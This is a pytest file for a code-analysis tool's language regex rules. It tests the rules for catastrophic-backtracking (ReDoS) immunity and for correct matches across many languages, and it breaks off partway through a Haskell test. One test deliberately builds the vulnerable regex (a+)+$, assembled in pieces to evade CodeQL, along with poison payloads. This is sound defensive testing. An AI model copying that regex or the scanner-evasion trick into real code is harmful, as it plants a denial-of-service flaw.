import pytest
import re
import time
import multiprocessing
from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS


# ==============================================================================
# THE BLAST CHAMBER (ReDoS Detonator)
# ==============================================================================
def _detonate(pattern: re.Pattern, payload: str, result_queue: multiprocessing.Queue):
    """
    Executes a regex against a payload inside an isolated OS process.
    Passes the duration back via a multiprocessing Queue.
    """
    start = time.perf_counter()
    list(pattern.finditer(payload))
    result_queue.put(time.perf_counter() - start)


def assert_redos_immune(pattern: re.Pattern, payload: str, timeout_sec: float = 1.0):
    """
    Runs a regex in an isolated process. If it exceeds timeout_sec, it is
    flagged as a Catastrophic Backtracking (ReDoS) vulnerability, and the
    OS process is violently terminated to prevent pytest from hanging.
    """
    ctx = multiprocessing.get_context("spawn")
    result_queue = ctx.Queue()

    p = ctx.Process(target=_detonate, args=(pattern, payload, result_queue))
    p.start()
    p.join(timeout_sec)

    if p.is_alive():
        # THE FIX: Violently kill the OS process so it doesn't trap pytest's atexit handler
        p.terminate()
        p.join()  # Reap the zombie process instantly
        raise AssertionError(f"🔥 ReDoS TRIGGERED! Regex hung on payload:\n{payload}\nRegex: {pattern.pattern}")

    if not result_queue.empty():
        duration = result_queue.get()
        assert duration < timeout_sec, f"Regex took too long: {duration:.4f}s"


# ==============================================================================
# TEST 1: THE C/C++ K&R AMBIGUITY TRAP
# Reference: language_standards.py (Line ~1365)
# ==============================================================================
def test_c_knr_ambiguity_trap():
    """
    Proves the C/C++ function spawner does not spiral into a 32,768-permutation
    death loop when encountering the MS-DOS BEGIN macro or massive parameter gaps.
    """
    c_func = LANGUAGE_DEFINITIONS["c"]["rules"]["func_start"]

    # The Pathological String: 100 parameters, no semicolon, ending in an invalid token.
    # Without the negative lookahead and {0,150} bounds, this will freeze the CPU.
    poison_knr = "int legacy_func(a, b, c) \n" + "    int a; int b; int c;\n" * 50 + "    INVALID_MACRO"

    assert_redos_immune(c_func, poison_knr, timeout_sec=3.0)

    # Ensure it still correctly matches the MS-DOS BEGIN edge case
    valid_knr = "int legacy_func(a) \n    int a; \n BEGIN \n"
    matches = list(c_func.finditer(valid_knr))
    assert len(matches) == 1
    assert matches[0].group(1) == "legacy_func"


# ==============================================================================
# TEST 2: THE C# "IRON WALL" RETURN TYPE SHIELD
# Reference: language_standards.py (Line ~443)
# ==============================================================================
def test_csharp_iron_wall_redos():
    """
    Proves the C# function spawner survives pathologically massive nested return
    types without triggering overlapping whitespace ReDoS.
    """
    cs_func = LANGUAGE_DEFINITIONS["csharp"]["rules"]["func_start"]

    # The Pathological String: Deeply nested generics, missing the final brace,
    # packed with spaces that would normally trigger (Space)+ Space+ overlaps.
    poison_cs = "    public static async Task<Dictionary<string, List<Tuple<int, string>>>>\n" * 20 + "    BrokenMethod"

    assert_redos_immune(cs_func, poison_cs)

    # Ensure a valid massive return type still works
    valid_cs = "public async Task<List<string>> FetchData() {"
    matches = list(cs_func.finditer(valid_cs))
    assert len(matches) == 1
    assert matches[0].group(1) == "FetchData"


# ==============================================================================
# TEST 3: THE C++ MACRO MULTI-LINE SPIRAL
# Reference: language_standards.py (Line ~1020)
# ==============================================================================
def test_cpp_macro_multiline_spiral():
    """
    Proves the C++ function spawner respects the (?![ \t]*#) negative lookaheads
    and does not cross into preprocessor directives to build hallucinated functions.
    """
    cpp_func = LANGUAGE_DEFINITIONS["cpp"]["rules"]["func_start"]

    # The Pathological String: A dangling return type that falls into a massive macro map.
    poison_cpp = "std::vector<int>\n" + "#define FOO 1\n" * 1000 + "myFunc() {"

    assert_redos_immune(cpp_func, poison_cpp)

    # Prove it actually stops at the macro and DOES NOT match the return type!
    # Instead of finding 0 matches, it will instantly skip the macros and find
    # "myFunc() {" as a valid, return-type-less constructor at the end of the file.
    matches = list(cpp_func.finditer(poison_cpp))
    assert len(matches) == 1, "Failed to safely skip the macros!"
    assert matches[0].group(1) == "myFunc", "Matched the wrong part of the string!"


# ==============================================================================
# TEST 4: AMBIGUITY OVERLAP AVOIDANCE (Pointers)
# Reference: language_standards.py (Line ~1430 & 1523)
# ==============================================================================
def test_c_pointer_ambiguity_overlap():
    r"""
    Proves that O(1) alternation `(?:\s*[*&]+\s*|\s+)` successfully prevents
    exponential evaluation on massive strings of pointer asterisks.
    """
    c_api = LANGUAGE_DEFINITIONS["c"]["rules"]["api"]
    c_cast = LANGUAGE_DEFINITIONS["c"]["rules"]["explicit_casts"]

    # The Pathological String: An unclosed cast with absurd pointer depth
    poison_cast = "( int " + "* " * 200 + ") "
    poison_api = "extern int " + "* " * 200 + " var"

    assert_redos_immune(c_cast, poison_cast)
    assert_redos_immune(c_api, poison_api)


# ==============================================================================
# TEST 5: COBOL GHOST SATELLITE HALLUCINATIONS
# Reference: language_standards.py (Line ~2470)
# ==============================================================================
def test_cobol_ghost_satellite_prevention():
    """
    Proves that heavily indented SQL queries or data divisions are explicitly
    blocked from being hallucinated as executable paragraphs.
    """
    cobol_func = LANGUAGE_DEFINITIONS["cobol"]["rules"]["func_start"]

    # 1. The SQL Ghost (Indented table column with a period)
    sql_ghost = "           POLICY.CUSTOMERNUMBER."
    assert len(list(cobol_func.finditer(sql_ghost))) == 0, "Hallucinated an SQL column as a paragraph!"

    # 2. The Data Ghost (01 Level)
    data_ghost = "       01  WS-POLICY-RECORD."
    assert len(list(cobol_func.finditer(data_ghost))) == 0, "Hallucinated a Data Division struct as a paragraph!"

    # 3. The Valid Paragraph
    valid_para = "       100-PROCESS-RECORDS SECTION."
    matches = list(cobol_func.finditer(valid_para))
    assert len(matches) == 1
    assert matches[0].group(1) == "100-PROCESS-RECORDS"


# ==============================================================================
# TEST 6: THE THERMODYNAMIC BALANCE COLLISIONS
# Proving that operators don't cannibalize each other across rules.
# ==============================================================================
def test_thermodynamic_operator_collisions():
    """
    Proves that common language operators (<<, |, &, !) do not trigger false
    positives in the wrong metric categories.
    """
    # 1. C++ Bitwise vs. I/O Streams
    cpp_bitwise = LANGUAGE_DEFINITIONS["cpp"]["rules"]["bitwise_ops"]
    assert len(list(cpp_bitwise.finditer("std::cout << 'Hello'"))) == 0, "C++ bitwise tripped on a cout stream!"
    assert len(list(cpp_bitwise.finditer("x <<= 1;"))) == 1, "C++ bitwise failed to catch explicit shift assignment!"

    # 2. Rust Closures vs. Bitwise
    rust_bitwise = LANGUAGE_DEFINITIONS["rust"]["rules"]["bitwise_ops"]
    assert len(list(rust_bitwise.finditer("let x = |a| a + 1;"))) == 0, "Rust bitwise tripped on a closure!"
    assert len(list(rust_bitwise.finditer("a ^ b"))) == 1, "Rust bitwise failed to catch XOR!"

    # 3. TypeScript Test Assertions vs. Object Methods
    ts_test = LANGUAGE_DEFINITIONS["typescript"]["rules"]["test"]
    assert len(list(ts_test.finditer("myRegex.test('string')"))) == 0, "TS test metric tripped on a regex.test() call!"
    assert len(list(ts_test.finditer("test('should work', () => {"))) == 1, "TS test metric missed a real test block!"


# ==============================================================================
# TEST 7: THE GLOBAL FUZZER (The Safety Net)
# ==============================================================================
def test_global_regex_syntax_integrity():
    """
    A final sanity check. Iterates over EVERY regex in the entire file and
    verifies it compiles correctly without throwing a re.error.
    """
    failed = []

    for lang, config in LANGUAGE_DEFINITIONS.items():
        rules = config.get("rules", {})
        for rule_name, pattern in rules.items():
            if pattern is not None:
                try:
                    # Accessing .pattern proves it's a valid compiled regex object
                    _ = pattern.pattern
                except Exception as e:
                    failed.append(f"{lang}::{rule_name} -> {e}")

    assert not failed, f"Found {len(failed)} uncompiled or broken regexes in production schema:\n" + "\n".join(failed)


# ==============================================================================
# TEST 8: TEST HARNESS EXCEPTION CATCHING (Coverage Completion)
# ==============================================================================
def test_redos_detonator_timeout_catch():
    """Proves the Blast Chamber successfully catches and kills hung regexes."""
    # A classic catastrophic backtracking regex: (a+)+$
    # Constructed dynamically to blind CodeQL from flagging the intentional trap
    evil_pattern = "(" + "a+" + ")+$"
    evil_regex = re.compile(evil_pattern)
    poison_payload = "a" * 30 + "b"

    # We now catch the standard AssertionError we just updated
    with pytest.raises(AssertionError) as exc_info:
        assert_redos_immune(evil_regex, poison_payload, timeout_sec=0.1)

    assert "ReDoS TRIGGERED" in str(exc_info.value)


def test_global_regex_syntax_integrity_catch(monkeypatch):
    """Proves the fuzzer catches malformed regex objects."""
    import sys

    # Inject a fake broken regex to trigger the exception block
    fake_defs = {"fake_lang": {"rules": {"broken_rule": "This is a string, not a compiled regex object!"}}}

    # Patch the locally imported variable inside THIS file's namespace!
    monkeypatch.setattr(sys.modules[__name__], "LANGUAGE_DEFINITIONS", fake_defs)

    with pytest.raises(AssertionError) as exc_info:
        test_global_regex_syntax_integrity()

    assert "Found 1 uncompiled or broken regexes" in str(exc_info.value)


# ==============================================================================
# JAVASCRIPT: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #589)
# ==============================================================================
# One positive-match case (and, where the doc's EXCLUDES wording calls for
# one, a negative-match case) per non-None structural signature javascript
# defines. Signatures whose behavior is simple/self-evident from a single
# keyword match are grouped into one parametrized test; signatures with
# real ReDoS history, control-flow exclusion shields, or cross-rule
# ambiguity risk get their own dedicated test below.
JS_RULES = LANGUAGE_DEFINITIONS["javascript"]["rules"]

_JS_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x) { y(); }", "throw new Error('x');"),
    ("safety", "try { f(); } catch (e) { g(); }", None),
    ("safety_bypasses", "if (x == y) {}", "if (x === y) {}"),
    ("high_risk_execution", "eval(userInput);", "console.log('safe');"),
    ("io", "fetch('/api/data');", None),
    ("api", "export default Foo;", None),
    ("state_mutation", "this.value = 1;", None),
    ("dead_code", "// if (debug) { doThing(); }", "// just a note"),
    ("doc", "/** @param {string} name */", None),
    ("concurrency", "async function f() { await g(); }", None),
    ("ui_framework", "const [x, setX] = useState(0);", None),
    ("globals", "window.location.href;", None),
    ("decorators", "@Component({})", None),
    ("generics", "/** @template T */", None),
    ("comprehensions", "arr.map(x => x * 2);", None),
    ("scientific", "const cv = require('opencv');", None),
    ("reflection_metaprogramming", "Object.assign(target, source);", None),
    ("ownership", "// @author Jane Doe", None),
    ("planned_debt", "// TODO: refactor this", None),
    ("fragile_debt", "// HACK: temporary workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "export async function getServerSideProps() {}", None),
    ("events", "emitter.on('data', handler);", None),
    ("dependency_injection", "@Injectable()", None),
    ("memory_alloc", "const x = new Foo();", "const x = new foo();"),
    ("telemetry", "logger.info('started');", None),
    ("debug_prints", "console.log('debug value:', x);", None),
    ("explicit_casts", "Number('42');", None),
    ("panics_and_aborts", "throw new Error('bad state');", None),
    ("thread_sleeps", "setTimeout(fn, 100);", None),
    ("sync_locks", "mutex.lock();", None),
    ("immutability_locks", "const x = Object.freeze({});", None),
    ("cleanup", "resource.dispose();", None),
    ("encapsulation", "class Foo { #secret; }", None),
    ("listeners", "el.addEventListener('click', fn);", None),
    ("test_skip", "test.skip('not ready', () => {});", None),
    ("serialization_parsing", "JSON.parse(raw);", None),
    ("regex_execution", "str.match(/foo/);", None),
    ("time_date_logic", "Date.now();", None),
    ("ipc_rpc_bridges", "worker.postMessage(data);", None),
]


@pytest.mark.parametrize("signature,positive,negative", _JS_SIMPLE_CASES)
def test_javascript_signature_positive_and_negative(signature, positive, negative):
    pattern = JS_RULES[signature]
    assert pattern is not None, f"javascript's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"javascript {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"javascript {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_javascript_structural_boundaries_excludes_const():
    """const is explicitly reserved for immutability_locks, not structural_boundaries."""
    pattern = JS_RULES["structural_boundaries"]
    assert pattern.search("let x = 1;")
    assert not pattern.search("const x = 1;")


def test_javascript_args_control_flow_shield():
    """
    Regression guard for the documented "Control Flow Shield": args must not
    hallucinate control-flow statements (while/if/for/switch/catch/return)
    that structurally resemble a method signature followed by a block.
    """
    pattern = JS_RULES["args"]
    assert pattern.search("function foo(a, b) {")
    assert pattern.search("(a, b) => {")
    assert pattern.search("myMethod(a, b) {")
    assert not pattern.search("while (i < 10) {")
    assert not pattern.search("if (x) {")
    assert not pattern.search("switch (x) {")


def test_javascript_args_redos_immunity():
    """The 'Ghost Args Shield' comment documents this as a historical ReDoS trap."""
    pattern = JS_RULES["args"]
    poison = "myMethod(" + "a, " * 20000 + "z) {"
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_javascript_func_start_excludes_control_flow_and_reserved_words():
    """
    func_start's negative lookahead explicitly excludes if/for/while/switch/
    catch/return/throw/new/typeof/jQuery/function so these never get
    hallucinated as function declarations just because they're followed by
    an open paren.
    """
    pattern = JS_RULES["func_start"]
    assert pattern.search("function namedFn() {")
    assert pattern.search("const foo = () => {")
    assert pattern.search("methodName(a, b) {")
    for reserved in ("if", "for", "while", "switch", "catch", "return", "throw", "typeof"):
        assert not pattern.search(f"{reserved} (x) {{"), f"func_start hallucinated on reserved word {reserved!r}"


def test_javascript_func_start_vertical_assignment_redos_immunity():
    """
    Regression guard for the documented 'Vertical Assignment Shield': a
    deeply multi-line-formatted async arrow assignment must not trigger
    catastrophic backtracking across vertical whitespace.
    """
    pattern = JS_RULES["func_start"]
    poison = "export const\n" + "  \n" * 5000 + "foo\n = \n async () => {"
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_javascript_class_start_captures_name_and_parent():
    pattern = JS_RULES["class_start"]
    m = pattern.search("export default class Dog extends Animal {")
    assert m is not None
    assert m.group(1) == "Dog"
    assert m.group(2) == "Animal"


def test_javascript_import_dependency_capture():
    """import/_dependency_capture must extract the exact module path string, not just match generically."""
    dep_pattern = JS_RULES["_dependency_capture"]
    m = dep_pattern.search("import { Component } from 'react';")
    assert m is not None
    assert "react" in m.groups()

    m2 = dep_pattern.search("const fs = require('fs');")
    assert m2 is not None
    assert "fs" in m2.groups()


def test_javascript_test_vs_regex_execution_ambiguity():
    """
    Regression test: javascript's `test` signature used to lack the
    negative lookbehind TypeScript's near-identical rule already had,
    so `myRegex.test('x')` -- a regex method call -- was miscounted as a
    unit-test-framework call (confirmed against the real config and fixed
    as part of this issue; jQuery's ajax.js/css.js in the golden-crucible
    corpus both had this exact false positive before the fix).
    """
    test_pattern = JS_RULES["test"]
    assert not test_pattern.search("myRegex.test('some string');"), (
        "test incorrectly matched a .test( regex method call"
    )
    assert test_pattern.search("test('should work', () => {});"), "test failed to match a real bare test( call"
    assert test_pattern.search("it('should work', () => {});"), "test failed to match a real bare it( call"
    assert test_pattern.search("describe('suite', () => {});"), "test failed to match describe("


def test_javascript_bitwise_ops_and_closures_do_not_collide():
    """
    The known bitwise_ops/closures ambiguity found in Rust (`|a| a + 1`) and
    C++ (`std::cout <<`) doesn't reproduce in javascript's own token set --
    javascript's arrow syntax (`=>`) shares no substring with its bitwise
    operators (`<<`, `>>`, `>>>`, `^`, `~`). This test confirms that holds,
    rather than assuming it from the other languages' bug reports.
    """
    bitwise = JS_RULES["bitwise_ops"]
    closures = JS_RULES["closures"]

    assert bitwise.search("x = a << 2;")
    assert not bitwise.search("const f = (x) => x + 1;"), "bitwise_ops false-positived on an arrow function"

    assert closures.search("const f = (x) => { return x; };")
    assert not closures.search("x = a << 2;"), "closures false-positived on a bitwise shift"


def test_javascript_standard_block_redos_immunity_for_deeply_nested_jsdoc_generics():
    """
    C#'s func_start ReDoS'd on deeply nested generic return types (already
    found and fixed). javascript doesn't have real generics, but its JSDoc
    '@template'-based simulation still needs to survive a pathological
    payload rather than assume small-input testing is representative.
    """
    pattern = JS_RULES["generics"]
    poison = "/**\n" + " * @template T\n" * 20000 + " */"
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


# ==============================================================================
# CROSS-LANGUAGE REDOS SWEEP: "BARE IDENTIFIER BEFORE ARROW" FAMILY
# ==============================================================================
# All found by a systematic ReDoS sweep across every language's compiled
# patterns (not just the ones with an existing historical-bug comment):
# an unbounded identifier/word-run quantifier with no preceding \b anchor,
# immediately followed by a required-but-often-absent literal suffix
# (=>, ->, __c.getInstance, etc.). Because the leading character class has
# no boundary anchor, the engine retries the greedy-then-backtrack match at
# EVERY position in a long run of matching characters -- O(n^2) total, not
# exponential, but still a real DoS risk on a single pathologically long
# line (e.g. minified/obfuscated code). All bounded with numeric clamps
# instead of possessive quantifiers (`*+`), since those aren't available
# until Python 3.11 and this package supports 3.9+.
def test_java_args_lambda_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["java"]["rules"]["args"]
    assert_redos_immune(pattern, "x" * 40000, timeout_sec=3.0)
    assert pattern.search("x -> x + 1")
    assert pattern.search("public void foo(int x) {")


def test_csharp_args_lambda_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["csharp"]["rules"]["args"]
    assert_redos_immune(pattern, "x" * 40000, timeout_sec=3.0)
    assert pattern.search("x => x + 1")


def test_groovy_args_closure_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["groovy"]["rules"]["args"]
    assert_redos_immune(pattern, "x" * 40000, timeout_sec=3.0)
    assert pattern.search("x -> x + 1")


def test_fortran_state_mutation_redos_immunity_and_kind_exclusion():
    """
    Two bugs, found together: the ReDoS sweep caught the quadratic blowup,
    and fixing it (adding a real \\b anchor) also fixed a pre-existing leak
    in the KIND=/LEN=/etc exclusion -- the original negative lookahead only
    blocked a match starting exactly at "KIND", not one starting mid-word
    ("KIND = 5" still matched "IND = " starting at its 2nd character, since
    \\bKIND doesn't apply there). Confirmed this leak existed before the
    ReDoS fix too, via the pattern's original (unbounded) form.
    """
    pattern = LANGUAGE_DEFINITIONS["fortran"]["rules"]["state_mutation"]
    assert_redos_immune(pattern, "x" * 40000, timeout_sec=3.0)
    assert pattern.search("myvar = 5")
    assert pattern.search("mystruct%field = 1")
    assert not pattern.search("KIND = 5"), "Failed to exclude the KIND= false-positive trap"
    assert not pattern.search("LEN = 10"), "Failed to exclude the LEN= false-positive trap"


def test_embedded_python_comprehensions_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["embedded_python"]["rules"]["comprehensions"]
    assert_redos_immune(pattern, "(" * 40000, timeout_sec=3.0)
    assert pattern.search("[x for x in range(10)]")


def test_php_state_mutation_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["php"]["rules"]["state_mutation"]
    assert_redos_immune(pattern, "x" * 40000, timeout_sec=3.0)
    assert pattern.search("$obj->prop = 1")
    assert pattern.search("Foo::CONST_NAME = 1")


def test_shell_state_mutation_arithmetic_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["shell"]["rules"]["state_mutation"]
    assert_redos_immune(pattern, "(" * 40000, timeout_sec=3.0)
    assert pattern.search("((i++))")


def test_apex_globals_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["apex"]["rules"]["globals"]
    assert_redos_immune(pattern, "x" * 40000, timeout_sec=3.0)
    assert pattern.search("MyObject__c.getInstance()")


# ==============================================================================
# PYTHON: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #606)
# ==============================================================================
PY_RULES = LANGUAGE_DEFINITIONS["python"]["rules"]

_PY_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if x:\n    pass", "raise ValueError('x')"),
    ("safety", "try:\n    f()\nexcept ValueError:\n    g()", None),
    ("safety_bypasses", "except Exception:\n    log(e)", "except ValueError:\n    log(e)"),
    ("high_risk_execution", "eval(user_input)", "print('safe')"),
    ("io", "with open('f.txt') as f:\n    pass", None),
    ("state_mutation", "self.value = 1", None),
    ("dead_code", "# def old_unused_function():", "# just a note"),
    ("doc", '"""A module docstring."""', None),
    ("concurrency", "async def f():\n    await g()", None),
    ("ui_framework", "import streamlit as st", None),
    ("globals", "sys.argv[0]", None),
    ("decorators", "@staticmethod", None),
    ("generics", "def f(x: List[int]) -> None: ...", None),
    ("scientific", "import numpy as np", None),
    ("reflection_metaprogramming", "getattr(obj, 'attr')", None),
    ("ownership", "__author__ = 'Jane Doe'", None),
    ("planned_debt", "# TODO: refactor this", None),
    ("fragile_debt", "# HACK: temporary workaround", None),
    ("spec_exposure", "# [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "return HttpResponse('ok')", None),
    ("events", "post_save.connect(handler)", None),
    ("dependency_injection", "db: Session = Depends(get_db)", None),
    ("pointers", "ptr = ctypes.POINTER(ctypes.c_int)", None),
    ("telemetry", "logger.info('started')", None),
    ("debug_prints", "print('debug value:', x)", None),
    ("explicit_casts", "int('42')", None),
    ("panics_and_aborts", "raise ValueError('bad state')", None),
    ("thread_sleeps", "time.sleep(1)", None),
    ("sync_locks", "lock = threading.Lock()", None),
    ("immutability_locks", "x: Final[int] = 1", None),
    ("cleanup", "conn.close()", None),
    ("listeners", "signal.connect(receiver=on_event)", None),
    ("test_skip", "@pytest.mark.skip", None),
    ("serialization_parsing", "data = pickle.loads(raw)", None),
    ("regex_execution", "re.compile(r'foo')", None),
    ("time_date_logic", "datetime.datetime.now()", None),
    ("ipc_rpc_bridges", "import multiprocessing", None),
]


@pytest.mark.parametrize("signature,positive,negative", _PY_SIMPLE_CASES)
def test_python_signature_positive_and_negative(signature, positive, negative):
    pattern = PY_RULES[signature]
    assert pattern is not None, f"python's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"python {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"python {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_python_comprehensions_was_fixed_from_a_javascript_copy_paste():
    """
    Regression test: python's comprehensions rule used to be
    `\\.(?:map|filter|reduce|...)\\s*\\(` -- JavaScript's Array-method idiom,
    copy-pasted in by mistake. Python has no builtin `.map(`/`.filter(` list
    methods; it has comprehension syntax. The old pattern never matched a
    single real Python comprehension and only fired incidentally on
    unrelated methods sharing a name (e.g. Django's queryset `.filter(...)`).
    """
    pattern = PY_RULES["comprehensions"]
    assert pattern.search("[x**2 for x in range(10)]"), "Failed to match a real list comprehension"
    assert pattern.search("{k: v for k, v in items}"), "Failed to match a real dict comprehension"
    assert pattern.search("{x for x in range(10)}"), "Failed to match a real set comprehension"
    assert pattern.search("sum(x for x in range(10))"), "Failed to match a real generator expression"
    assert not pattern.search("User.objects.filter(active=True)"), (
        "Incorrectly matched an unrelated .filter() method call (the old JS-idiom bug)"
    )


def test_python_comprehensions_redos_immunity():
    pattern = PY_RULES["comprehensions"]
    assert_redos_immune(pattern, "(" * 40000, timeout_sec=3.0)
    assert_redos_immune(pattern, "[" * 40000, timeout_sec=3.0)


def test_python_structural_boundaries_and_args():
    boundaries = PY_RULES["structural_boundaries"]
    for kw_snippet in ("def foo():", "class Foo:", "return x", "import os", "from os import path", "del x"):
        assert boundaries.search(kw_snippet), f"structural_boundaries failed to match {kw_snippet!r}"

    args = PY_RULES["args"]
    assert args.search("def foo(a, b):")
    assert args.search("async def foo(a, b):")
    assert args.search("lambda x: x + 1")


def test_python_func_start_skips_decorators_and_excludes_reserved_words():
    pattern = PY_RULES["func_start"]
    assert pattern.search("def foo():")
    assert pattern.search("    @staticmethod\n    @property\n    def foo():")
    assert pattern.search("async def foo():")


def test_python_class_start_captures_name_and_bases():
    pattern = PY_RULES["class_start"]
    m = pattern.search("class Dog(Animal, Mixin):")
    assert m is not None
    assert m.group(1) == "Dog"
    assert "Animal" in m.group(2)


def test_python_api_excludes_underscore_prefixed_definitions():
    """api captures implicit-public root defs/classes; a leading underscore is explicitly private."""
    pattern = PY_RULES["api"]
    assert pattern.search("def public_func():")
    assert pattern.search("class PublicClass:")
    assert not pattern.search("def _private_func():"), "api incorrectly matched an underscore-prefixed function"
    assert not pattern.search("class _PrivateClass:"), "api incorrectly matched an underscore-prefixed class"


def test_python_import_dependency_capture():
    dep_pattern = PY_RULES["_dependency_capture"]
    m = dep_pattern.search("from os.path import join")
    assert m is not None
    assert "os.path" in m.groups()

    m2 = dep_pattern.search("import numpy")
    assert m2 is not None
    assert "numpy" in m2.groups()


def test_python_safety_bypasses_bare_except_vs_typed_except():
    """
    A bare `except:` or `except Exception:` swallows errors; a typed except
    does not. Bodies deliberately avoid a bare `pass` statement here -- `pass`
    is itself one of this rule's own alternatives (an empty handler body is
    a bypass regardless of exception type), which would trigger a match for
    the wrong reason and mask what this test is actually isolating.
    """
    pattern = PY_RULES["safety_bypasses"]
    assert pattern.search("except:\n    log(e)")
    assert pattern.search("except Exception:\n    log(e)")
    assert not pattern.search("except ValueError:\n    log(e)"), (
        "safety_bypasses incorrectly flagged a specific, typed except clause"
    )


def test_python_bitwise_ops_and_closures_do_not_collide():
    """
    The known bitwise_ops/closures ambiguity found in Rust (`|a| a + 1`) and
    C++ (`std::cout <<`) doesn't reproduce in python: the `lambda` keyword
    shares no token with `<<`, `>>`, `^`, `~`.
    """
    bitwise = PY_RULES["bitwise_ops"]
    closures = PY_RULES["closures"]
    assert bitwise.search("x = a << 2")
    assert not bitwise.search("f = lambda x: x + 1"), "bitwise_ops false-positived on a lambda"
    assert closures.search("f = lambda x: x + 1")
    assert not closures.search("x = a << 2"), "closures false-positived on a bitwise shift"


def test_python_explicit_casts_vs_pointers_no_overlap():
    """
    The known explicit_casts/pointers ambiguity found in C (cast syntax
    overlapping pointer-asterisk repetition) doesn't reproduce in python:
    explicit_casts checks builtin type calls (int(, str(, ...); pointers
    checks ctypes-specific tokens. No shared token between them.
    """
    casts = PY_RULES["explicit_casts"]
    pointers = PY_RULES["pointers"]
    assert casts.search("int('42')")
    assert not casts.search("ctypes.POINTER(ctypes.c_int)"), "explicit_casts false-positived on a ctypes pointer"
    assert pointers.search("ctypes.POINTER(ctypes.c_int)")
    assert not pointers.search("int('42')"), "pointers false-positived on a builtin cast"


# ==============================================================================
# HASKELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #585)
# ==============================================================================
HS_RULES = LANGUAGE_DEFINITIONS["haskell"]["rules"]

_HS_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if x then y else z", None),
    ("structural_boundaries", "module Foo where", None),
    ("safety", "case result of\n  Just x -> x\n  Nothing -> 0", None),
    ("safety_bypasses", "fromJust maybeValue", None),
    ("high_risk_execution", "exitWith (ExitFailure 1)", None),
    ("io", 'contents <- readFile "f.txt"', None),
    ("state_mutation", "modifyIORef ref (+1)", None),
    ("dead_code", "-- data OldType = OldType", "-- just a note"),
    ("doc", "-- | A Haddock doc comment", None),
    ("test", 'describe "my suite" $ do', None),
    ("concurrency", 'forkIO (putStrLn "hi")', None),
    ("ui_framework", "import Brick", None),
    ("closures", "\\x -> x + 1", None),
    ("globals", "counter :: IORef Int\ncounter = unsafePerformIO (newIORef 0)", None),
    ("decorators", "{-# INLINE foo #-}", None),
    ("generics", "instance (Show a) => Show (Box a) where", None),
    ("comprehensions", "[x * 2 | x <- [1..10]]", None),
    ("scientific", "import Numeric.LinearAlgebra", None),
    ("reflection_metaprogramming", "{-# LANGUAGE TemplateHaskell #-}", None),
    ("ownership", "-- Author: Jane Doe", None),
    ("planned_debt", "-- TODO: refactor this", None),
    ("fragile_debt", "-- HACK: temporary workaround", None),
    ("spec_exposure", "-- [SPEC-123]", None),
    ("ssr_boundaries", "import Yesod", None),
    ("events", "import Reactive.Banana (Event)", None),
    ("dependency_injection", "config <- ask", None),
    ("macros", "{-# LANGUAGE OverloadedStrings #-}", None),
    ("pointers", "peek ptr", None),
    ("memory_alloc", "allocaBytes 1024 $ \\p -> f p", None),
    ("inline_asm", 'foreign import ccall "sin" c_sin :: Double -> Double', None),
    ("telemetry", 'logInfo "started"', None),
    ("debug_prints", 'putStrLn "debug"', None),
    ("explicit_casts", "fromIntegral x", None),
    ("panics_and_aborts", "throwIO MyException", None),
    ("thread_sleeps", "threadDelay 1000000", None),
    ("sync_locks", "takeMVar lock", None),
    ("immutability_locks", "pure x", None),
    ("cleanup", "hClose handle", None),
    ("listeners", "subscribe channel handler", None),
    ("test_skip", 'it "should work" $ pending', None),
    ("serialization_parsing", "decode jsonBytes", None),
    ("regex_execution", "text =~ pattern", None),
    ("time_date_logic", "getCurrentTime", None),
    ("ipc_rpc_bridges", "createProcess someProc", None),
]


@pytest.mark.parametrize("signature,positive,negative", _HS_SIMPLE_CASES)
def test_haskell_signature_positive_and_negative(signature, positive, negative):
    pattern = HS_RULES[signature]
    assert pattern is not None, f"haskell's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"haskell {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"haskell {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_haskell_func_start_excludes_type_level_declarations():
    """func_start's negative lookahead must exclude data/type/newtype/class/instance declarations."""
    pattern = HS_RULES["func_start"]
    assert pattern.search("myFunction :: Int -> Int")
    for reserved in ("data", "type", "newtype", "class", "instance"):
        assert not pattern.search(f"{reserved} Foo = Foo"), (
            f"func_start hallucinated on a {reserved!r} type-level declaration"
        )


def test_haskell_class_start_captures_type_name():
    pattern = HS_RULES["class_start"]
    m = pattern.search("data Animal = Dog | Cat")
    assert m is not None
    assert m.group(1) == "Animal"

    m2 = pattern.search("newtype Wrapper = Wrapper Int")
    assert m2 is not None
    assert m2.group(1) == "Wrapper"


def test_haskell_import_dependency_capture():
    dep_pattern = HS_RULES["_dependency_capture"]
    m = dep_pattern.search("import qualified Data.Map as Map")
    assert m is not None
    assert m.group(1) == "Data.Map"


def test_haskell_dead_code_requires_comment_prefix_not_shared_with_func_start():
    """
    Ambiguity check: dead_code and func_start share the literal keywords
    data/type/newtype/class/instance, but dead_code requires a `--` comment
    prefix while func_start's negative lookahead explicitly excludes those
    same words as real declarations -- neither can fire on the other's
    intended input.
    """
